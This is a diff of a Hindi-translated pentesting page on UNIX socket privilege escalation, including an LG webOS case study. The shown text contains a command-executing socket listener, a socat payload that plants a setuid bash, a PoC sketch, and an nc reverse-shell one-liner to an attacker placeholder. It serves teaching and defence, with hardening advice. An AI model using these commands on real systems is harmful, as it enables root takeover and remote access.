@@ -4,7 +4,7 @@
 
 ## Python के साथ Socket binding का उदाहरण
 
-निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और **प्राप्त होने वाली हर चीज़** को `os.system` द्वारा **execute किया जाता है**। मुझे पता है कि आपको ऐसा वास्तविक दुनिया में नहीं मिलेगा, लेकिन इस उदाहरण का उद्देश्य यह देखना है कि unix sockets का उपयोग करने वाला code कैसा दिखता है और सबसे खराब स्थिति में input को कैसे manage किया जाए।
+निम्नलिखित उदाहरण में एक **unix socket बनाया जाता है** (`/tmp/socket_test.s`) और **प्राप्त होने वाली हर चीज़** को `os.system` द्वारा **execute किया जाता है**।मुझे पता है कि आपको ऐसा wild में नहीं मिलेगा, लेकिन इस उदाहरण का लक्ष्य यह दिखाना है कि unix sockets का उपयोग करने वाला code कैसा दिखता है और सबसे खराब स्थिति में input को कैसे manage किया जाए।
 ```python:s.py
 import socket
 import os, os.path
@@ -26,7 +26,7 @@ print(datagram)
 os.system(datagram)
 conn.close()
 ```
-**कोड चलाएं** using python: `python s.py` और **जांचें कि socket किस प्रकार listening कर रहा है**:
+**कोड को चलाएँ**: `python s.py` और **जाँचें कि socket कैसे listen कर रहा है**:
 ```python
 netstat -a -p --unix | grep "socket_test"
 (Not all processes could be identified, non-owned process info
@@ -37,15 +37,15 @@ unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        
 ```python
 echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
 ```
-## केस स्टडी: Root-owned UNIX socket signal-triggered escalation (LG webOS)
+## Case study: Root-owned UNIX socket signal-triggered escalation (LG webOS)
 
-कुछ privileged daemons एक ऐसा root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करता है और privileged actions को thread-IDs तथा signals से जोड़ता है। यदि protocol किसी unprivileged client को यह प्रभावित करने देता है कि किस native thread को target किया जाए, तो आप privileged code path trigger करके escalation कर सकते हैं।
+कुछ privileged daemons ऐसे root-owned UNIX socket expose करते हैं जो untrusted input स्वीकार करते हैं और privileged actions को thread-IDs तथा signals से जोड़ते हैं। यदि protocol किसी unprivileged client को यह प्रभावित करने देता है कि किस native thread को target किया जाए, तो आप privileged code path को trigger करके escalate करने में सक्षम हो सकते हैं।<sup>[[1]](#references)</sup>
 
-देखा गया pattern:
-- किसी root-owned socket (जैसे /tmp/remotelogger) से connect करें।
-- एक thread बनाएँ और उसका native thread id (TID) प्राप्त करें।
-- TID (packed) और padding को request के रूप में भेजें; acknowledgement प्राप्त करें।
-- privileged behaviour trigger करने के लिए उस TID को एक specific signal भेजें।
+Observed pattern:
+- किसी root-owned socket से connect करें (जैसे, /tmp/remotelogger)।
+- एक thread बनाएं और उसका native thread id (TID) प्राप्त करें।
+- TID (packed) तथा padding को request के रूप में भेजें; acknowledgement प्राप्त करें।
+- privileged behaviour को trigger करने के लिए उस TID को एक specific signal भेजें।
 
 Minimal PoC sketch:
 ```python
@@ -64,12 +64,12 @@ os.kill(tid, 4)  # deliver SIGILL (example from the case)
 rm -f /tmp/f; mkfifo /tmp/f
 cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
 ```
-Notes:
-- इस प्रकार के bugs unprivileged client state (TIDs) पर भरोसा करने और उन्हें privileged signal handlers या logic से bind करने के कारण उत्पन्न होते हैं।
-- Harden करने के लिए socket पर credentials लागू करें, message formats को validate करें, और privileged operations को externally supplied thread identifiers से decouple करें।
+नोट्स:
+- Bugs की यह class unprivileged client state (TIDs) से प्राप्त values पर भरोसा करने और उन्हें privileged signal handlers या logic से bind करने के कारण उत्पन्न होती है।
+- Socket पर credentials लागू करके, message formats को validate करके और privileged operations को externally supplied thread identifiers से decouple करके harden करें।
 
-## संदर्भ
+## References
 
-- [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
+- [1] [LG WebOS TV Path Traversal, Authentication Bypass and Full Device Takeover (SSD Disclosure)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
 
 {{#include ../../banners/hacktricks-training.md}}
